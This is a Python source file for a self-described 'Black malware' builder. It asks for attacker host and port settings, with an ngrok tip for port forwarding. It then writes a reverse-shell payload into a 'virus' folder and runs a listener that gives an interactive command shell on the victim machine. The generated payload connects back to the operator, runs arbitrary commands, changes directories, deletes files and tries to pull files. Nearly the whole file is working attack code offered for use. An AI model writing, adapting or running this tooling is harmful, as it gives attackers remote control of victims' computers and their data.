from socket import *
from colorama import Fore 
from lists import banner 
from builder import build
import time
import sys
def server():
    build.linux()
    banner.banner()
    print(Fore.BLUE+"Pleas Enter ip server . . .  ")
    ip = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    build.linux()
    banner.banner()
    print(Fore.LIGHTBLUE_EX+"Pleas Enter port . . . ")
    port = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    build.linux()
    banner.banner()
    print(Fore.LIGHTGREEN_EX+"Pleas Set ip . . . |"+Fore.LIGHTRED_EX+"For port forwarding Enter link ngrok")
    lhost = input(str(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# "))
    build.linux()
    banner.banner()
    print(Fore.LIGHTBLUE_EX+"Pleas set port . . . ")
    lport = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    build.linux()
    banner.banner()
    print(Fore.LIGHTCYAN_EX+"Pleas Enter the name of payload . . .")
    name = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    
    
    path = (f"""
    
    
    
    
    
from socket import *

import subprocess

import os 
import sys

s = socket(2,1)
s.connect(("{lhost}",{lport}))

while True:
   # s.send(os.getcwd().encode()+" > ".encode
   # s.send(os.getcwd().encode()+" > ".encode())
   # s.send(cwd.encode())
    data = s.recv(1234).decode()
    
    if data[0:2] == "cd":
        os.chdir(data[3:])
        s.send("ok".encode())
    if data[0:8] == "download":
        file = open(data[9:],"rb")
        s.send(file.encode())
    shel = subprocess.getoutput(data)
    s.send(shel.encode())
    if data[0:2] == "rm":
        os.remove(data[3:])
        s.send("remoced . . . ".encode())
    if data == "exit":
        s.send("disconnected . . . ".encode())
        sys.exit()
    
    
    
    
 """)
 
    f = open("virus/"+name+".py","w")
    f.write(path)
    f.close()
    time.sleep(8)
    print(Fore.LIGHTBLUE_EX+"CREATED PAYLOAD in folder "+Fore.RED+"/virus")
    time.sleep(0.5)
    print(Fore.WHITE+"Runing server pleas dont close this session . . . . ")
    s = socket(AF_INET , SOCK_STREAM)
    s.bind((ip , int(port)))
    s.listen(5)
    time.sleep(2)
    print(Fore.GREEN+"\n[+] runed server ")
    time.sleep(0.1)
    print(Fore.RED+"[!] Pleas wait . . . ")
        
        
    client , addr = s.accept()
    print(Fore.RED+"opened session |  "+Fore.CYAN+(addr)[0])
        
    while True:
        comm = input(Fore.BLUE+"shell"+Fore.WHITE+"/"+Fore.RED+">> ")
        client.send(comm.encode())
        data = client.recv(1234).decode()
        if data == "disconnected . . . ":
            time.sleep(2)
            print(Fore.LIGHTRED_EX+"\This connect client :(")
            sys.exit()
            
        print(data)
    

 
   